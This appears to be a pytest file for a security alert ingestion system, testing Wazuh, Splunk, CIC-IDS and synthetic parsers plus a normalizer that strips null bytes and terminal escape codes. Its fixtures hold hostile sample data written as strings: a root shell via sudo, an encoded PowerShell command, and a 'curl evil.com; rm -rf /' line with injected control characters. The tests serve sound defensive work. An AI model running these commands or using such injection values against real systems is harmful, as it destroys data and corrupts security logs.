"""Unit Tests for Alert Ingestion and Normalization Subsystem."""
import pytest
from src.domain.enums import AlertSourceFormat, AlertSeverity
from src.ingestion.normalizer import AlertNormalizer
from src.ingestion.parsers import WazuhParser, SplunkParser, CICIDSParser, SyntheticParser


@pytest.fixture
def normalizer():
    return AlertNormalizer()


def test_wazuh_parser_can_parse():
    parser = WazuhParser()
    payload = {
        "rule": {"level": 12, "description": "High privilege command execution via sudo", "groups": ["syslog"]},
        "agent": {"id": "002", "name": "prod-db-01", "ip": "10.0.0.5"},
        "data": {
            "srcip": "192.168.1.100",
            "dstip": "10.0.0.5",
            "process": "sudo",
            "command_line": "sudo -u root /bin/bash",
            "user": "developer",
        },
    }
    assert parser.can_parse(payload) is True
    normalized = parser.parse(payload)
    assert normalized.source_format == AlertSourceFormat.WAZUH
    assert normalized.raw_severity == AlertSeverity.CRITICAL
    assert normalized.endpoint.hostname == "prod-db-01"
    assert normalized.endpoint.command_line == "sudo -u root /bin/bash"
    assert normalized.network.src_ip == "192.168.1.100"
    assert normalized.identity.username == "developer"


def test_splunk_parser_can_parse():
    parser = SplunkParser()
    payload = {
        "sourcetype": "WinEventLog:Security",
        "host": "WS-FINANCE-04",
        "CommandLine": "powershell.exe -enc JABhID0A...",
        "process_name": "powershell.exe",
        "user": "alice",
        "severity": "high",
    }
    assert parser.can_parse(payload) is True
    normalized = parser.parse(payload)
    assert normalized.source_format == AlertSourceFormat.SPLUNK
    assert normalized.raw_severity == AlertSeverity.HIGH
    assert normalized.endpoint.process_name == "powershell.exe"
    assert normalized.identity.username == "alice"


def test_cic_ids_parser_can_parse():
    parser = CICIDSParser()
    payload = {
        "Dst Port": 80,
        "Flow Duration": 1200000,
        "Tot Fwd Pkts": 45,
        "Tot Bwd Pkts": 30,
        "TotLen Fwd Pkts": 3400.0,
        "TotLen Bwd Pkts": 12000.0,
        "Protocol": 6,
        "Label": "DDoS attacks-LOIC-HTTP",
    }
    assert parser.can_parse(payload) is True
    normalized = parser.parse(payload)
    assert normalized.source_format == AlertSourceFormat.CIC_IDS
    assert normalized.raw_severity == AlertSeverity.CRITICAL
    assert normalized.network.dst_port == 80
    assert normalized.network.protocol == "TCP"


def test_synthetic_parser():
    parser = SyntheticParser()
    payload = {
        "source_format": "synthetic",
        "signature": "Synthetic Port Scan & Brute Force",
        "raw_severity": "critical",
        "network": {"src_ip": "185.220.101.5", "dst_ip": "10.0.1.50", "dst_port": 22},
        "identity": {"username": "admin", "auth_status": "FAILED"},
    }
    assert parser.can_parse(payload) is True
    normalized = parser.parse(payload)
    assert normalized.source_format == AlertSourceFormat.SYNTHETIC
    assert normalized.raw_severity == AlertSeverity.CRITICAL
    assert normalized.network.src_ip == "185.220.101.5"


def test_normalizer_sanitization_defense(normalizer):
    # Alert with potential log injection / null byte poisoning
    payload = {
        "rule": {"level": 6, "description": "Malicious cmd with null byte\x00SYSTEM OVERRIDE"},
        "agent": {"name": "server-01\x08"},
        "data": {
            "command_line": "curl evil.com\x00 --silent; rm -rf /",
            "user": "root\x1b[31m",
        },
    }
    normalized = normalizer.normalize(payload)
    assert "\x00" not in normalized.signature
    assert "\x00" not in normalized.endpoint.command_line
    assert "\x1b" not in normalized.identity.username
    assert normalized.raw_severity == AlertSeverity.MEDIUM
